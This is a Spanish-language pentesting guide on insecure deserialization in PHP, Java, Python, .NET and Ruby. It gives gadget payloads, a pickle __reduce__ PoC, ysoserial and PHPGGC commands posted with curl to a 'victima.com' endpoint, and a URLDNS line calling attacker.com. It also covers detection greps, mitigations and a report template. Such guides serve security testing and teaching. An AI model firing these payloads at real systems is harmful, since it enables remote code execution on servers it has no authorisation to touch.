# Deserialización Insegura 

## Resumen

La deserialización insegura ocurre cuando una aplicación deserializa datos de usuarios sin validación, permitiendo a un atacante enviar objetos (o cargas) que, al deserializarse, ejecutan código arbitrario, modifican el flujo de la aplicación o desencadenan ataques de lógica. Afecta principalmente a formatos binarios o de texto con capacidad de invocar constructores o métodos, como Java Serialization, PHP unserialize, Python pickle, .NET BinaryFormatter, Ruby Marshal.

## Contexto

Las aplicaciones distribuidas usan deserialización para comunicar objetos entre servicios (RPC, colas de mensajes, sesiones, caché distribuida). Motores comunes:

- **Java:** `java.io.ObjectInputStream`
- **PHP:** `unserialize()`
- **Python:** `pickle.loads`
- **.NET:** `BinaryFormatter.Deserialize`
- **Ruby:** `Marshal.load`

Las `gadget chains` en bibliotecas permiten ejecutar código al deserializar.

## Metodología de Ataque

### 1. Identificación de Puntos de Deserialización

- Analizar endpoints que reciban datos serializados: parámetros POST BINARIOS, cookies de sesión, tokens JWT personalizados, colas (RabbitMQ, Kafka), cachés (Memcached).
- Buscar funciones `unserialize`, `pickle.loads`, `BinaryFormatter.Deserialize`.

### 2. Pruebas Manuales

#### 2.1 PHP `unserialize`

```php
$data = $_POST['data'];
$obj = unserialize($data);
```

- Probar payloads de gadget:

```php
O:8:"EvilClass":1:{s:4:"cmd";s:2:"id";}
```

- Reconocer clases disponibles con métodos mágicos (`__wakeup`, `__destruct`).

#### 2.2 Java Serialization

- Enviar `java.io.Serializable` payload generado con ysoserial:

```bash
ysoserial CommonsCollections5 'touch /tmp/pwned' | base64
```

- Endpoint decodifica base64 y deserializa: ejecuta comando.

#### 2.3 Python Pickle

```python
import pickle
class Evil(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))
payload = pickle.dumps(Evil())
```

### 3. Generación de Payloads Automatizada

- **PHPGGC** para cadenas de gadgets en PHP
- **ysoserial** para Java
- **marshalsec** para .NET
- Scripts Python para pickle

## PoC

### PHP Example

```php
<?php
class Evil {
  public $cmd;
  function __destruct(){
    system($this->cmd);
  }
}
$evil = new Evil();
$evil->cmd = 'id > /tmp/p';
echo urlencode(serialize($evil));
?>
```

Enviar `data` POST con este valor, verificar `/tmp/p` creado.

### Java Example

```bash
payload=$(java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned')
curl -X POST https://victima.com/deserialize \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary "$payload"
```

## Automatización

### PHPGGC

```bash
phpggc monolog/RCE1 system 'id' --phar > exploit.phar
curl -F "file=@exploit.phar" https://victima.com/upload
```

### ysoserial CLI

```bash
java -jar ysoserial.jar URLDNS attacker.com | curl -X POST https://victima.com/deserialize --data-binary @-
```

## Explotación / Impacto

- **RCE completo** con privilegios de aplicación.
- **Desbordamiento de flujo**: bypass autenticación, escalada de privilegios.
- **Exfiltración de datos**: lectura de archivos, bases de datos.
- **Pivot interno**: acceso a redes privadas desde servidor.

## Detección

```bash
grep -R "unserialize" .  
grep -R "ObjectInputStream" .  
grep -R "pickle.loads" .
```

Monitor de logs: excepciones de deserialización, stack traces.

## Mitigaciones

1. **Evitar deserialización de datos no confiables.**
2. **Usar formatos seguros:** JSON, XML (con validación de esquema).
3. **Firmar y verificar integridad:** HMAC en datos serializados antes de deserializar.
4. **Lista blanca de clases permitidas:** limitar clases deserializables (`allow-list`).
5. **Isolación de procesos:** deserializar en contenedores o sandboxes.

## Reporte

**Título:** Deserialización Insegura – Ejecución Arbitraria de Código
**Resumen Ejecutivo:** El endpoint `/deserialize` decodifica y deserializa objetos de usuarios sin verificación, permitiendo RCE.
**Pasos de Reproducción:**

1. Generar payload con ysoserial CommonsCollections5.
2. Enviar POST a `/deserialize` con payload binario.
3. Verificar ejecución de comando (`touch /tmp/pwned`).
   **Mitigación Recomendada:** Deshabilitar deserialización directa, usar JSON con validación, firmar datos e implementar whitelist de clases.
